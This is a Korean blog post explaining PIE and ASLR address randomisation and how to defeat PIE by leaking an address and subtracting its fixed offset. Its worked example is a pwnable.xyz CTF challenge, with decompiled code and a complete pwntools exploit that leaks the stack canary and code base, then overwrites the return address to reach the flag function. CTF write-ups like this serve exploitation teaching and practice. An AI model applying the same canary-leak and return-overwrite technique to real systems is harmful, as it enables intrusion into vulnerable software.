---
tistoryBlogName: k0n9
tistoryTitle: PIE
tistoryVisibility: "3"
tistoryCategory: "0"
tistorySkipModal: true
tistoryPostId: "31"
tistoryPostUrl: https://k0n9.tistory.com/31
---
위치독립실행, 바이너리 주소 랜덤화 즉 메모리상의 명렁어들의 위치가 매번 바뀐다. ASLR이 코드 영역에도 적용되게 해주는 기술이라고 볼 수 있다. 이때 ASLR이 0이면 PIE를 적용해도 주소랜덤화는 작동을 하지 않는다. ASLR이 1이면 PIE를 적용했을 때 전체 주소가 랜덤화된다. (2일때도 마찬가지)

#### 예
```C
#include <stdio.h>

int hello(){ 
	printf("hello"); 
	return 0; 
}

int x; 
int y = 10;

int main(){ 
int a; 
int *b = (int_)malloc(10);

printf("code : %p\n", hello); 
printf("Data : %p\n", &y); 
printf("BSS : %p\n", &x); 
printf("heap : %p\n", b); 
printf("stack : %p\n", &a); 
return 0; 
}
```

![](https://i.imgur.com/D5Qjkw3.png)

주소값이 계속 바뀌는것을 알 수 있다.

##### pie 우회기법 
pie를 우회하기 위해서는 오프셋을 구하고 코드 영역의 임의주소를 구하고 거기서 오프셋을 빼서 베이스 주소를 구해야 한다.

## tip

library 주소랜덤화가 되는 방법은 주소는 보통 libc base + offset으로 이루어져 있다. 그리고 offset은 바뀌지 않으며 libc base를 바꿈으로서 주소 랜덤화가 된다. 즉 offset 부분인 주소의 하위 1.5바이트 xxx 는 고정이고 libc base는 항상 하위 1.5바이트가 000으로 유지된다.

그리고 이 offset은 라이브러리 버전마다 다르기 때문에 이를 이용해서 라이브러리 버전을 찾을수도 있다. 

### 예제_pwnalbe.xyz

checksec
![](https://i.imgur.com/olHbWiZ.png)


main함수
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_CB8();
  puts("Yolo yada yada - Play with me!");
  puts("===========================================");
  sub_EAD();
  return 0LL;
}
```

```C
unsigned __int64 sub_EAD()
{
  size_t v0; // rax
  size_t v2; // rax
  char *s1; // [rsp+8h] [rbp-78h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 canary; // [rsp+78h] [rbp-8h]

  canary = __readfsqword(0x28u);
  while ( 1 )
  {
    s1 = (char *)sub_D48();
    memset(s, 0, 0x64uLL);
    printf("Your score: %d\n", qword_202248);
    printf("me  > %s\n", s1);
    printf("you > ");
    v0 = strlen(s1);
    read(0, s, v0 + 1);
    if ( !strncmp(s, "exit", 4uLL) )
      break;
    v2 = strlen(s1);
    if ( !strncmp(s1, s, v2) )
    {
      printf("You said: %s", s);
      puts("Yay, you're good at this, let's go on :)\n");
      ++qword_202248;
    }
    else
    {
      printf("You said: %s", s);
      puts("I don't think you understood how this game works :(\n");
      --qword_202248;
    }
    free(s1);
  }
  free(s1);
  puts("Ya go away, I don't want to play with you anymore anyways :P\n");
  return __readfsqword(0x28u) ^ canary;
}
```

flag를 출력하는 함수가 있다.
![](https://i.imgur.com/MLdX0TI.png)

해당 코드에서의 취약점은 s1의 크기는 랜덤한 값인데 s는 104로 고정되어있다. s1의 크기는 약 113 ~ 135 정도이다.  즉 buffer(104) + canary(8) + sfp(8) + ret(8) = 128 을 모두 덮을 충분한 크기라는 것이다. 우선 처음 입력으로 canary를 leak 하고 ret을 leak해서 code base를 구한다. 그리고 ret을 sub_D30() 으로 overwrite하고 exit를 하면 flag가 출력된다. 이때 s1이 충분한 크기여야 하기 때문에 약간의 브루트포싱이 필요하다.

```python
from pwn import *
  
# context.log_level = 'debug'
  
# p = process("./challenge")
p = remote("svc.pwnable.xyz",30027)
  
code_off = 0x1081
flag_off = 0xd34
  
p.recvuntil(b"me  > ")
me = p.recv(104)
  
p.sendlineafter(b"you > ", me)
p.recvuntil(b"\n")
canary = u64(b"\x00"+p.recv(7)) # canary
  
while(1):
    p.recvuntil(b"me  > ")
    me2 = p.recvuntil(b"\n")
    if(len(me2) >= 121):
        break
    p.sendlineafter(b"you > ", b'd')
  
me3 = b'a'*104 # buf
me3 += b'a'*0xf # canary + sfp
p.sendlineafter(b"you > ", me3)
p.recvuntil(b"\x61\n")
code_add = u64(p.recv(6)+b"\x00\x00") # ret
code_base = code_add - code_off
flag = code_base + flag_off
  
while(1):
    p.recvuntil(b"me  > ")
    me4 = p.recvuntil(b"\n")
    if(len(me4) >= 130):
        break
    p.sendlineafter(b"you > ", b'd')

  
me5 = b'exit'
me5 += b'a'*100
me5 += p64(canary)
me5 += b'a'*8
me5 += p64(flag)
  
 
p.sendafter(b"you > ", me5)
  
 
p.interactive()
```
exit라는 문자열을 받으면 종료하는데 exit이후에 추가적으로 문자열을 적어도 종료가 된다. 그래서 exit를 입력함과 동시에 ret overwrite를 한다.

![](https://i.imgur.com/wNYheP9.png)

